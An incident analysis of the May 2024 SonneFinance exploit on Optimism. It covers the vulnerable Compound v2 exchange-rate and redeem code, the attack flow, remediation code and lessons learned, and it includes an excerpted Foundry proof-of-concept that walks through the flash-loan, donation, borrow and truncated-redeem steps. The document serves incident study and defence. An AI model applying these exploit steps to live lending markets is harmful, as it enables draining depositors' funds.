# SonneFinance — ERC4626 Inflation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2024-05-14 |
| **Protocol** | SonneFinance (Compound v2 Fork) |
| **Chain** | Optimism |
| **Loss** | ~$20,000,000 (including WETH, USDC.e, WBTC, wstETH, USDT, VELO) |
| **Attacker EOA1** | [0x5d0d...0bbb](https://optimistic.etherscan.io/address/0x5d0d99e9886581ff8fcb01f35804317f5ed80bbb) |
| **Attacker EOA2** | [0xae4A...3f43](https://optimistic.etherscan.io/address/0xae4a7cde7c99fb98b0d5fa414aa40f0300531f43) |
| **Attack Contract1** | [0xa78a...caf8](https://optimistic.etherscan.io/address/0xa78aefd483ce3919c0ad55c8a2e5c97cbac1caf8) |
| **Attack Contract2** | [0x02fa...c5B9](https://optimistic.etherscan.io/address/0x02fa2625825917e9b1f8346a465de1bbc150c5b9) |
| **Attack Tx (preparation)** | [0x45c0...db96](https://optimistic.etherscan.io/tx/0x45c0ccfd3ca1b4a937feebcb0f5a166c409c9e403070808835d41da40732db96) |
| **Attack Tx (main attack)** | [0x9312...7f0](https://optimistic.etherscan.io/tx/0x9312ae377d7ebdf3c7c3a86f80514878deb5df51aad38b6191d55db53e42b7f0) |
| **Vulnerable Contract (soVELO)** | [0xe3b8...5fE5](https://optimistic.etherscan.io/address/0xe3b81318b1b6776f0877c3770afddff97b9f5fe5) |
| **Attack Block** | 120,062,493 |
| **Root Cause** | Direct donation to newly added VELO market to manipulate soVELO exchange rate — Precision Loss (ERC4626 Inflation Attack) |
| **PoC Source** | [DeFiHackLabs — Sonne_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/Sonne_exp.sol) |

---

## 1. Vulnerability Overview

SonneFinance is a Compound v2-based lending protocol operating on the Optimism chain. On May 14, 2024, a governance vote added a **new VELO market (soVELO)**. The moment this market was activated, the attacker front-ran the timelock execution to carry out an **ERC4626 Inflation Attack (also known as a First Depositor Attack)**.

### Core Mechanism

The exchange rate (`exchangeRate`) in Compound v2's `CToken.sol` is calculated using the following formula:

```
exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply
```

- `totalCash` = `IERC20(underlying).balanceOf(address(this))` — actual token balance held by the contract
- `totalSupply` = total amount of soVELO minted

**Core vulnerability**: Because `totalCash` is read via `balanceOf()`, **directly transferring (donating) tokens** without minting or redeeming causes only the numerator to increase explosively while `totalSupply` remains unchanged. This inflates the `exchangeRate` to a number with dozens of digits.

The attacker exploited the newly empty soVELO market by:
1. **Depositing a minimal amount** (400,000,001 wei VELO → 2 wei soVELO)
2. **Directly donating the entire 35,469,150 VELO borrowed via flash loan** → causing the exchangeRate to skyrocket
3. Using the 2 wei of inflated soVELO as collateral to take out a large borrow from another pool (soUSDC)
4. Calling `redeemUnderlying()`, where **precision loss** caused only 1 wei of soVELO to be burned, recovering the entire donated VELO
5. Repaying the flash loan and keeping the net profit

This pattern is identical to the April 2023 Optimism Hundred Finance hack ($7M) — **the same attack vector repeated on the same chain one year later**.

---

## 2. Vulnerable Code Analysis

### 2.1 exchangeRate Calculation — Vulnerable to Direct Donation ❌

Compound v2 `CToken.sol`'s `exchangeRateStoredInternal()`:

```solidity
// ❌ Vulnerable code — getCash() returns the actual ERC20 balance, allowing manipulation via direct transfer
function exchangeRateStoredInternal() internal view returns (MathError, uint) {
    uint _totalSupply = totalSupply;
    if (_totalSupply == 0) {
        // Return initial exchange rate if pool is empty
        return (MathError.NO_ERROR, initialExchangeRateMantissa);
    } else {
        // ❌ getCash() = IERC20(underlying).balanceOf(address(this))
        // An attacker sending tokens directly via transfer() increases totalCash
        uint totalCash = getCash();

        uint cashPlusBorrowsMinusReserves;
        MathError err;
        (err, cashPlusBorrowsMinusReserves) = addThenSubUInt(
            totalCash, totalBorrows, totalReserves
        );
        if (err != MathError.NO_ERROR) { return (err, 0); }

        uint exchangeRate;
        // ❌ If totalSupply = 2 wei and totalCash = 35,471,603 VELO (18 decimals):
        // exchangeRate ≈ 17,735,851,964,756,377,265,143,988,000,000,000,000,000
        (err, exchangeRate) = divScalarByExpTruncate(
            cashPlusBorrowsMinusReserves,
            Exp({mantissa: _totalSupply})
        );
        return (MathError.NO_ERROR, exchangeRate);
    }
}
```

**Problem**: `getCash()` directly returns `IERC20.balanceOf(address(this))`. Because accounting is not managed via internal state variables, an ERC20 `transfer()` directly to the contract immediately inflates the `exchangeRate`.

### 2.2 redeemUnderlying — Precision Loss ❌

```solidity
// ❌ Vulnerable code — truncation occurs when calculating redeemTokens
function redeemUnderlyingInternal(uint redeemAmount) internal nonReentrant returns (uint) {
    // redeemTokens = redeemAmount / exchangeRate
    // e.g.: redeemAmount = 35,469,150 VELO, exchangeRate = 1.7e43
    // redeemTokens = 35,469,150e18 / 1.7e43 ≈ 1.999994 → truncated to 1 wei
    // ❌ Attacker holds 2 wei soVELO but only 1 wei is burned, leaving 1 wei soVELO intact
    uint redeemTokens = div_(redeemAmount, exchangeRate);
    // ...
    doTransferOut(redeemer, redeemAmount); // Full underlying asset is transferred out
}
```

**Problem**: When calculating `redeemTokens`, Solidity's integer division truncation causes the theoretical burn amount of 1.999994 wei soVELO to be **rounded down to 1 wei**. Since the attacker holds 2 wei soVELO, they can burn only 1 wei and retain the remaining 1 wei soVELO while recovering all VELO.

### 2.3 Timelock Governance — Permissionless Execution ❌

```solidity
// ❌ Vulnerable structure — anyone can execute after timelock expiry
function execute(
    address target,
    uint256 value,
    bytes memory data,
    bytes32 predecessor,
    bytes32 salt
) external payable {
    // ❌ No onlyRole(EXECUTOR_ROLE) — permissionless
    // Attacker directly executes the VELO market activation transaction
    // and immediately performs the inflation attack in the same block
    bytes32 id = hashOperation(target, value, data, predecessor, salt);
    require(isOperationReady(id));
    _execute(target, value, data);
}
```

**Problem**: The timelock executor role is configured as permissionless (anyone can execute), which allowed the attacker to **sequentially execute the VELO market activation and the inflation attack within the same block**.

### 2.4 Patched Code — Introduction of Virtual Assets ✅

```solidity
// ✅ Fixed code — OpenZeppelin ERC4626 recommended approach: virtual shares/assets
function _convertToShares(uint256 assets, Math.Rounding rounding)
    internal view virtual returns (uint256)
{
    // ✅ Adding 1 to totalAssets() and 10^_decimalsOffset to totalSupply()
    // makes it mathematically impossible for a first depositor to manipulate the exchange rate
    return assets.mulDiv(
        totalSupply() + 10 ** _decimalsOffset(),
        totalAssets() + 1,          // ✅ +1 prevents division by zero and mitigates inflation
        rounding
    );
}

// ✅ Alternative: protocol deposits a small amount at deploy time to keep totalSupply > 0
// This eliminates the entry condition for a first depositor attack
function _initializeMarket() internal {
    // ✅ Small deposit in the same transaction as governance execution → atomic deployment
    underlyingToken.transferFrom(treasury, address(this), INITIAL_DEPOSIT);
    _mint(address(0xdead), INITIAL_MINT); // Mint to dead address to establish totalSupply
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- VELO governance proposal is scheduled with a 2-day timelock
- Attacker monitors the timelock schedule
- Immediately after timelock expiry, attacker directly executes the VELO market activation transaction

### 3.2 Execution Phase

1. **Timelock execution (5 transactions)**: Set soVELO market parameters (collateral factor, oracle, collateral factor)
2. **VELO Approve**: Unlimited approve for the soVELO contract
3. **Flash swap initiation**: Flash loan of 35,469,150.965 VELO from the VolatileV2 USDC/VELO pool
4. **Minimal deposit**: Deposit 400,000,001 wei VELO into soVELO → mint 2 wei soVELO
5. **Large donation**: Transfer the entire flash-loaned VELO directly to the soVELO contract via transfer() → exchangeRate explodes
6. **Market entry**: `enterMarkets()` for soUSDC and soVELO
7. **Borrow**: Use 2 wei inflated soVELO as collateral to borrow 768,947,220,961 wei USDC.e from soUSDC
8. **Redeem**: Call `redeemUnderlying(total VELO balance - 1)` → Precision Loss burns only 1 wei soVELO, recovering all VELO
9. **Flash loan repayment**: Return VELO (principal - 1) + USDC fee (44,656,863,632 wei)
10. **Profit realization**: Net USDC.e profit secured (attack repeated on other pools in subsequent attack Txs)

### 3.3 Attack Flow Diagram

```
  ┌─────────────────────────────────────────────────────────────┐
  │                     Attacker (EOA)                          │
  │  0x5d0d...0bbb / 0xae4A...3f43                             │
  └──────────────────────┬──────────────────────────────────────┘
                         │ 1. TimelockController.execute() × 5
                         ▼
  ┌──────────────────────────────────────────────────────────────┐
  │              TimelockController (Governance Timelock)        │
  │  0x37fF...6b6                                                │
  │  - soVELO initialization / oracle setup / collateral factor  │
  └──────────────────────┬───────────────────────────────────────┘
                         │ 2. VELO market activation complete
                         ▼
  ┌──────────────────────────────────────────────────────────────┐
  │           VolatileV2 AMM Pool (USDC/VELO)                    │
  │  0x8134...c5                                                 │
  │  swap(0, 35_469_150 VELO, attacker, data)                   │
  └───────┬──────────────────────────────────────────────────────┘
          │ 3. Flash swap: borrow 35,469,150 VELO
          ▼
  ┌──────────────────────────────────────────────────────────────┐
  │              Attack Contract hook() callback                 │
  │  0xa78a...caf8 / 0x02fa...c5B9                               │
  └──────┬───────────────────────────────────────────────────────┘
         │
         │ 4. CErc20.mint(400_000_001) → mint 2 wei soVELO
         ▼
  ┌─────────────────────────────────────────────────────────────┐
  │                soVELO Contract                              │
  │  0xe3b8...5fE5                                              │
  │  totalSupply = 2 wei                                        │
  │  totalCash   = 400,000,001 wei VELO                         │
  └─────────────────────────────────────────────────────────────┘
         │
         │ 5. IERC20(VELO).transfer(soVELO, 35_469_150 VELO)  ← Direct donation (DONATION)
         ▼
  ┌─────────────────────────────────────────────────────────────┐
  │                soVELO Contract (post-inflation)             │
  │  totalSupply = 2 wei                  ← unchanged           │
  │  totalCash   ≈ 35,469,150 VELO        ← explosive increase  │
  │  exchangeRate ≈ 1.77 × 10^43         ← dozens of digits    │
  └─────────────────────────────────────────────────────────────┘
         │
         │ 6. enterMarkets([soUSDC, soVELO])
         │ 7. soUSDC.borrow(768_947_220_961 wei USDC.e)
         ▼
  ┌─────────────────────────────────────────────────────────────┐
  │              soUSDC Contract                                │
  │  Collateral value (2 wei soVELO) = exchangeRate × 2 ≈ $millions │
  │  → 768,947 USDC.e borrow approved                          │
  └─────────────────────────────────────────────────────────────┘
         │
         │ 8. soVELO.redeemUnderlying(totalVELO - 1)
         │    redeemTokens = 35,469,150 VELO / exchangeRate
         │                 = 1.999994 → truncation → 1 wei
         │    ※ Holds 2 wei; only 1 wei burned → 1 wei remains
         ▼
  ┌─────────────────────────────────────────────────────────────┐
  │  Attacker Final Holdings                                    │
  │  ✓ 35,469,150 VELO (full donation recovered)               │
  │  ✓ 768,947 USDC.e (borrowed, unrepaid)                     │
  │  ✓ 1 wei soVELO (remaining collateral)                     │
  └────────────────────────┬────────────────────────────────────┘
                           │ 9. Flash loan repayment (VELO principal + USDC fee)
                           ▼
                      Net profit: ~$20M (USDC.e, WETH, WBTC, wstETH, USDT, etc.)
```

### 3.4 Outcome

- **Attacker profit**: ~$20,000,000
- **Protocol loss**: ~$20,000,000 (795 WETH, 768,933 USDC.e, 162 WBTC, 1,667 wstETH, 777,632 USDT, etc.)
- **Additional rescue**: A Seal contributor deposited a small amount of additional VELO to prevent approximately $6.5M in further losses

---

## 4. PoC Code (Key Logic Excerpt from DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// SonneFinance ERC4626 Inflation Attack PoC
// Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/Sonne_exp.sol

contract ContractTest is Test {
    address soVELO  = 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5; // Target: VELO market
    address soUSDC  = 0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F; // Borrow pool
    address Unitroller = 0x60CF091cD3f50420d50fD7f707414d0DF4751C58; // Collateral validation controller
    address VELO_Token_V2 = 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db;
    address VolatileV2_USDC_VELO = 0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5;
    TimelockController t = TimelockController(0x37fF10390F22fABDc2137E428A6E6965960D60b6);

    function setUp() public {
        // Fork at the block just before the attack — soVELO market not yet activated
        vm.createSelectFork("optimism", 120_062_493 - 1);
    }

    function testExploit() public {
        // [Step 1] Directly execute the 5 soVELO setup transactions scheduled in the governance timelock
        // Permissionless timelock lets the attacker control execution timing
        bytes memory data1 = hex"fca7820b..."; // _setInitialExchangeRateMantissa
        bytes memory data2 = hex"f2b3abbd..."; // _setInterestRateModel
        bytes memory data3 = hex"55ee1fe1..."; // supportMarket
        bytes memory data4 = hex"a76b3fda..."; // _setPriceOracle (soVELO)
        bytes memory data5 = hex"e4028eee..."; // _setCollateralFactor

        t.execute(soVELO, 0, data1, bytes32(0), salt1);
        t.execute(soVELO, 0, data2, bytes32(0), salt2);
        t.execute(Unitroller, 0, data3, bytes32(0), salt3);
        t.execute(Unitroller, 0, data4, bytes32(0), salt4);
        t.execute(Unitroller, 0, data5, bytes32(0), salt5);
        // soVELO market is now active — totalSupply = 0 (empty market)

        // [Step 2] Unlimited approve for VELO
        IERC20(VELO_Token_V2).approve(soVELO, type(uint256).max);

        // [Step 3] Flash swap 35,469,150 VELO from the VolatileV2 AMM pool
        // The hook() callback executes the actual attack logic
        VolatileV2Pool(VolatileV2_USDC_VELO).swap(
            0,
            35_469_150_965_253_049_864_450_449, // 35,469,150 VELO (18 decimals)
            address(this),
            hex"01" // callback trigger
        );
    }

    function hook(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        // [Step 4] Deposit a tiny amount of VELO → mint 2 wei soVELO
        // soVELO totalSupply = 2 wei at this point
        CErc20Interface(soVELO).mint(400_000_001);
        // balanceOf(soVELO) = 400_000_001 wei VELO

        // [Step 5] Transfer the entire flash-loaned VELO directly to soVELO (donation)
        // Only transfer(), no mint() → totalSupply unchanged, only totalCash increases
        // exchangeRate = totalCash / totalSupply
        //              ≈ 35,469,150 VELO / 2 wei ≈ 1.77 × 10^43
        uint256 VeloAmountOfthis = IERC20(VELO_Token_V2).balanceOf(address(this));
        IERC20(VELO_Token_V2).transfer(soVELO, VeloAmountOfthis);

        // [Step 6] Enter soUSDC and soVELO markets (register collateral)
        address[] memory cTokens = new address[](2);
        cTokens[0] = soUSDC;
        cTokens[1] = soVELO;
        IUnitroller(Unitroller).enterMarkets(cTokens);

        // [Step 7] Borrow large amount of USDC.e from soUSDC using inflated collateral value
        // 2 wei soVELO collateral → collateral value = exchangeRate × 2 ≈ tens of millions of dollars
        CErc20Interface(soUSDC).borrow(768_947_220_961); // ~768,947 USDC.e

        // [Step 8] redeemUnderlying: exploit Precision Loss
        // redeemTokens = redeemAmount / exchangeRate
        //              = (35,469,150 VELO) / (1.77 × 10^43)
        //              = 1.999994 → truncation → burn 1 wei soVELO
        // Of the 2 wei held, only 1 wei burned → remaining 1 wei soVELO retained
        // Entire VELO is recovered!
        ICErc20Delegate(soVELO).redeemUnderlying(
            IERC20(VELO_Token_V2).balanceOf(soVELO) - 1 // Recover all VELO - 1
        );

        // [Step 9] Repay flash loan (return VELO principal - 1)
        IERC20(VELO_Token_V2).transfer(VolatileV2_USDC_VELO, amount1 - 1);

        // [Step 10] Pay flash loan fee in USDC.e
        IERC20(USDC).transfer(VolatileV2_USDC_VELO, 44_656_863_632);

        // Result: borrowed USDC.e remains as net profit
        // This attack is repeated on other pools (soWETH, soWBTC, etc.) for a total of ~$20M
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern | Similar Cases |
|----|--------|--------|-----|-----------|-----------|
| V-01 | ERC4626 Inflation Attack (First Depositor Attack) | CRITICAL | CWE-682 | `07_token_integration.md`, `16_accounting_sync.md` | Hundred Finance (2023), Wise Lending (2024) |
| V-02 | Precision Loss (Truncation Error) | CRITICAL | CWE-682 | `05_integer_issues.md` | Compound v2 vulnerability family |
| V-03 | Permissionless Timelock Execution (Governance Frontrunning) | HIGH | CWE-284 | `14_governance.md`, `06_frontrunning.md` | Hundred Finance (2023) identical |
| V-04 | Lack of Atomicity During Empty Market Initialization | HIGH | CWE-362 | `08_initialization.md`, `11_logic_error.md` | Common Compound v2 fork vulnerability |

### V-01: ERC4626 Inflation Attack (First Depositor Attack)

- **Description**: Compound v2 cToken's `getCash()` returns `IERC20.balanceOf(this)`, so an attacker can directly transfer tokens to increase `totalCash` without internal accounting, inflating the `exchangeRate`. This allows a minimal amount of cTokens to be used as collateral for the protocol's entire assets.
- **Impact**: The entire protocol liquidity can be drained in a single transaction. The attack was repeated on soWETH, soUSDC.e, soWBTC, sowstETH, and soUSDT in addition to soVELO.
- **Attack conditions**: (1) Empty market (totalSupply ≈ 0), (2) attacker can execute mint+donate in the same block as market activation

### V-02: Precision Loss (Truncation Error)

- **Description**: Inside `redeemUnderlying()`, calculating `redeemTokens = redeemAmount / exchangeRate` with Solidity integer division truncation reduces the actual number of cTokens that should be burned to 1 wei. The attacker redeems the entire underlying asset while burning only 1 of their 2 wei cTokens.
- **Impact**: The protocol additionally loses assets equivalent to the exchange rate value of 1 wei soVELO.
- **Attack conditions**: exchangeRate must be sufficiently inflated via V-01

### V-03: Permissionless Timelock Execution

- **Description**: The `execute()` function of the TimelockController has no executor role (`EXECUTOR_ROLE`) check, so once the timelock expires, anyone can execute pending transactions. The attacker directly executed the soVELO market activation Tx and immediately performed the attack in the same block.
- **Impact**: Governance security controls are bypassed; the protocol team cannot control the timing of market activation.
- **Attack conditions**: Timelock expiry, permissionless executor configuration

### V-04: Lack of Atomicity During Empty Market Initialization

- **Description**: Activating a new market (soVELO) involves multiple separate Txs within the timelock, and initial liquidity deposit does not happen atomically with market activation. The gap between these two steps gives an attacker an opportunity to intervene.
- **Impact**: In the empty market state, the attacker can become the first depositor.
- **Attack conditions**: Gap between the market activation Tx and the initial liquidity supply Tx

---

## 6. Remediation Recommendations

### Immediate Actions

**① Atomic Initial Deposit Upon Market Activation (Most Effective)**

```solidity
// ✅ Fixed code — deposit initial liquidity in the same transaction as market activation
function _supportMarketWithInitialDeposit(
    CToken cToken,
    uint256 initialDepositAmount
) external onlyAdmin {
    require(!markets[address(cToken)].isListed, "already listed");

    // Activate market
    markets[address(cToken)].isListed = true;

    // ✅ Immediately deposit small amount in same Tx → ensure totalSupply > 0
    // Mint to dead address to eliminate first depositor attack entry condition
    IERC20(cToken.underlying()).transferFrom(
        msg.sender, address(this), initialDepositAmount
    );
    cToken.mint(initialDepositAmount);
    IERC20(address(cToken)).transfer(
        address(0x000000000000000000000000000000000000dEaD),
        IERC20(address(cToken)).balanceOf(address(this))
    );

    emit MarketListed(cToken);
}
```

**② Introduction of Virtual Shares/Assets**

```solidity
// ✅ OpenZeppelin ERC4626 recommended approach — defend against inflation with virtual shares/assets
function _convertToShares(uint256 assets, Math.Rounding rounding)
    internal view virtual returns (uint256)
{
    // ✅ +1 offset prevents infinite exchange rate even in an empty market
    return assets.mulDiv(
        totalSupply() + 10 ** _decimalsOffset(), // add virtual shares
        totalAssets() + 1,                        // add virtual assets +1
        rounding
    );
}
```

**③ Restrict Timelock Executor Role**

```solidity
// ✅ Fixed code — only the protocol team can execute the timelock
function execute(
    address target, uint256 value,
    bytes memory data, bytes32 predecessor, bytes32 salt
) external payable onlyRole(EXECUTOR_ROLE) { // ✅ Role check added
    bytes32 id = hashOperation(target, value, data, predecessor, salt);
    require(isOperationReady(id), "TimelockController: operation is not ready");
    _execute(target, value, data);
    emit CallExecuted(id, 0, target, value, data);
}
```

**④ Add Minimum totalSupply Threshold Check**

```solidity
// ✅ Fixed code — enforce minimum totalSupply when calculating exchangeRate
function exchangeRateStoredInternal() internal view returns (MathError, uint) {
    uint _totalSupply = totalSupply;
    if (_totalSupply == 0) {
        return (MathError.NO_ERROR, initialExchangeRateMantissa);
    }
    // ✅ Revert if totalSupply is below threshold
    require(_totalSupply >= MIN_TOTAL_SUPPLY, "totalSupply too low");
    // ...
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| ERC4626 Inflation (V-01) | Introduce virtual assets (+1), mint small amount to dead address at deployment |
| Precision Loss (V-02) | Use ceiling division instead of truncation; set minimum threshold |
| Permissionless Timelock (V-03) | Designate `EXECUTOR_ROLE`; restrict execution to multisig only |
| Market Initialization Atomicity (V-04) | Bundle market activation + initial deposit into a single Tx |
| General Compound v2 Fork | Mandate security audit checklist before market activation; monitor empty market state |

---

## 7. Lessons Learned

### 7.1 Comparison with Hundred Finance (2023) — Recurrence of the Same Pattern

| Field | Hundred Finance (2023-04-15) | SonneFinance (2024-05-14) |
|------|------------------------------|---------------------------|
| **Chain** | Optimism | Optimism (same) |
| **Loss** | ~$7M | ~$20M |
| **Attack Vector** | Direct donation to hWBTC cToken | Direct donation to soVELO cToken |
| **Vulnerable Token** | WBTC | VELO |
| **Timelock Abuse** | N/A | Permissionless timelock execution |
| **Attacker Profit** | ~$7M | ~$20M |
| **Successful Defense** | None | Seal contributor rescued $6.5M |

**Lesson**: Despite one year passing since the Hundred Finance incident, the same chain and the same vulnerability pattern produced losses three times larger. This demonstrates that mitigations for known vulnerabilities were not applied across Compound v2 forks broadly.

### 7.2 General Lessons

1. **Proactive mitigation of known vulnerabilities**: The ERC4626 inflation attack was extensively documented in 2022–2023. Every protocol operating a Compound v2 fork must verify defenses against the first depositor attack whenever a new market is added.

2. **New market activation must be atomic**: Market parameter configuration and initial liquidity supply must be handled in a single transaction. Multiple separate Txs within a timelock give attackers a window to intervene.

3. **The danger of permissionless timelocks**: A "anyone can execute" timelock becomes an entry point for governance attacks. The executor role must be restricted to the protocol team or a multisig to control the timing of market activation.

4. **Awareness of common Compound v2 fork vulnerabilities**: The Compound v2 architecture is the foundation for dozens of DeFi protocols, but the `getCash() = balanceOf(this)` design itself contains the seed of an inflation attack. Consider migrating to Compound v3 or following OpenZeppelin ERC4626 guidelines.

5. **On-chain monitoring and rapid response**: Sonne Finance paused the market within 25 minutes of detecting the attack, and with the help of an external whitehat, prevented an additional $6.5M in losses. This demonstrates that real-time anomaly detection systems and emergency pause mechanisms are effective at containing damage.

6. **Audits alone are insufficient**: SonneFinance went through a governance process to add the VELO market, yet failed to preemptively block the permissionless nature of timelock execution and the possibility of an inflation attack against an empty market. A post-deployment verification process is necessary.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Field | PoC Value | On-Chain Actual Value | Match |
|------|--------|-------------|------|
| Flash loan VELO | 35,469,150,965,253,049,864,450,449 wei | 35,469,150 VELO | ✅ |
| Initial mint amount | 400,000,001 wei | 400,000,001 wei VELO | ✅ |
| soVELO minted | 2 wei | 2 wei soVELO | ✅ |
| USDC.e borrowed | 768,947,220,961 wei | ~768,947 USDC.e | ✅ |
| Flash loan fee | 44,656,863,632 wei USDC | ~44,656 USDC.e | ✅ |
| soVELO exchangeRate | ~1.77 × 10^43 | 17,735,851,964,756,377,265,143,988,000... | ✅ |
| Total loss | — | ~$20,000,000 | ✅ |

### 8.2 On-Chain Event Log Order (Attack Tx: 0x9312...7f0)

1. `TimelockController.execute()` × 5 (soVELO market configuration)
2. `VELO.Approval(attacker → soVELO, MAX_UINT256)`
3. `VolatileV2Pool.swap()` callback triggered
4. `VELO.Transfer(attacker → soVELO, 400_000_001)` — mint
5. `soVELO.Mint(minter=attacker, mintAmount, mintTokens=2)`
6. `VELO.Transfer(attacker → soVELO, 35,469,150 VELO)` — direct donation (**core attack vector**)
7. `Comptroller.enterMarkets([soUSDC, soVELO])`
8. `soUSDC.Borrow(borrower=attacker, borrowAmount=768,947 USDC.e)`
9. `soVELO.RedeemUnderlying(redeemer=attacker, redeemAmount, redeemTokens=1)` — truncation occurs
10. `VELO.Transfer(attacker → VolatileV2Pool)` — flash loan repayment
11. `USDC.Transfer(attacker → VolatileV2Pool, 44,656 USDC.e)` — fee

### 8.3 Pre-condition Verification (Block Just Before Attack: 120,062,492)

| Field | State Just Before Attack | Significance |
|------|--------------|------|
| soVELO totalSupply | 0 | Empty market — inflation attack condition met |
| soVELO exchangeRate | initialExchangeRateMantissa (initial value) | Market newly activated |
| Timelock state | Ready (expired) | Anyone can execute |
| Attacker VELO balance | 0 (sourced via flash loan) | Attack possible with zero capital |

---

*Analysis references: [Halborn](https://www.halborn.com/blog/post/explained-the-sonne-finance-hack-may-2024), [CertiK](https://www.certik.com/resources/blog/sonne-finance-incident-analysis), [QuillAudits](https://www.quillaudits.com/blog/hack-analysis/sonne-finance-hack), [Nefture Medium](https://medium.com/coinmonks/sonne-finance-exploit-tracing-the-20-million-lost-to-the-hack-79140bbc3e7d), [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/Sonne_exp.sol)*